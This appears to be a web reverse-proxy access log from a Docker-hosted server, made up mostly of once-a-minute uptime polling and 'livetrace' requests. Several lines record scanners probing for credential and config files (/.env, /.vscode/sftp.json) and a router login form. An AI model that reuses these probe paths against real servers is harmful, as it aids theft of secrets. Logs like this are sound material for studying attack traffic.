173.48.140.140 - - [16/Dec/2023:03:46:21 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 713 "-" "-" 811 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:22 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 713 "-" "-" 812 "livetrace@docker" "http://172.29.0.3:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 813 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:23 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 715 "-" "-" 814 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:24 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 715 "-" "-" 815 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:25 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 715 "-" "-" 816 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:03:46:26 +0000] "GET /trace/polltrace.php?id=opcd0c8c7 HTTP/2.0" 200 968 "-" "-" 817 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:03:46:26 +0000] "GET /trace/cleantrace.php?id=opcd0c8c7 HTTP/2.0" 200 72 "-" "-" 818 "livetrace@docker" "http://172.29.0.3:80" 3ms
167.71.120.76 - - [16/Dec/2023:03:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 819 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 820 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 821 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 822 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 823 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 824 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 825 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 826 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 827 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 828 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 829 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 830 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 831 "www@docker" "http://172.29.0.8:80" 0ms
57.129.23.166 - - [16/Dec/2023:03:53:21 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 832 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:03:53:21 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 833 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:03:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 834 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 835 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 836 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 837 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 838 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 839 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 840 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 841 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 842 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 843 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:03:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 844 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:03:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 845 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:03:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 846 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:03:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 847 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 848 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 849 "www@docker" "http://172.29.0.8:80" 0ms
45.95.169.184 - - [16/Dec/2023:04:00:45 +0000] "POST /index.htm HTTP/1.1" 308 18 "-" "-" 850 "web-to-websecure@internal" "-" 0ms
45.95.169.184 - - [16/Dec/2023:04:00:46 +0000] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.1" 308 18 "-" "-" 851 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:04:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 852 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 853 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 854 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 855 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 856 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 857 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:04:03:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 858 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:04:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 859 "www@docker" "http://172.29.0.8:80" 0ms
41.216.188.119 - - [16/Dec/2023:04:04:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 308 18 "-" "-" 860 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:04:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 861 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 862 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 863 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 864 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 865 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 866 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 867 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 868 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 869 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 870 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 871 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 872 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 873 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 874 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 875 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 876 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 877 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 878 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 879 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 880 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 881 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 882 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 883 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 884 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 885 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 886 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 887 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 888 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 889 "www@docker" "http://172.29.0.8:80" 1ms
90.151.171.108 - - [16/Dec/2023:04:19:16 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 890 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:04:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 891 "www@docker" "http://172.29.0.8:80" 0ms
90.151.171.108 - - [16/Dec/2023:04:19:26 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 892 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:04:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 893 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 894 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 895 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:04:20:41 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 896 "livetrace@docker" "http://172.29.0.3:80" 5ms
173.48.140.140 - - [16/Dec/2023:04:20:41 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 897 "livetrace@docker" "http://172.29.0.3:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 898 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:04:21:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 899 "web-to-websecure@internal" "-" 0ms
80.79.117.42 - - [16/Dec/2023:04:21:30 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 900 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:04:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 901 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 902 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 903 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 904 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 905 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 906 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 907 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 908 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 909 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 910 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 911 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 912 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 913 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 914 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 915 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 916 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 917 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 918 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 919 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 920 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 921 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 922 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 923 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 924 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 925 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 926 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 927 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 928 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 929 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 930 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 931 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 932 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 933 "www@docker" "http://172.29.0.8:80" 0ms
87.236.176.54 - - [16/Dec/2023:04:37:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 934 "web-to-websecure@internal" "-" 0ms
87.236.176.54 - - [16/Dec/2023:04:37:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 935 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:04:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 936 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 937 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 938 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 939 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 940 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 941 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 942 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 943 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 944 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 945 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 946 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 947 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 948 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 949 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 950 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 951 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 952 "www@docker" "http://172.29.0.8:80" 1ms
35.216.205.103 - - [16/Dec/2023:04:46:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 953 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:04:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 954 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 955 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 956 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 957 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 958 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 959 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 960 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 961 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 962 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 963 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 964 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 965 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 966 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 967 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 968 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:04:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 969 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 970 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 971 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:04:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 972 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 973 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 974 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 975 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 976 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:04:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 977 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 978 "www@docker" "http://172.29.0.8:80" 0ms
54.36.115.221 - - [16/Dec/2023:04:58:57 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 979 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:04:58:57 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 980 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:04:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 981 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:04:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 982 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 983 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:05:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 984 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:05:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 985 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 986 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:05:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 987 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:05:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 988 "www@docker" "http://172.29.0.8:80" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 989 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 990 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:10 +0000] "GET /version HTTP/1.1" 404 19 "-" "-" 991 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:11 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 19 "-" "-" 992 "-" "-" 0ms
139.144.150.23 - - [16/Dec/2023:05:03:11 +0000] "GET /about HTTP/1.1" 404 19 "-" "-" 993 "-" "-" 0ms
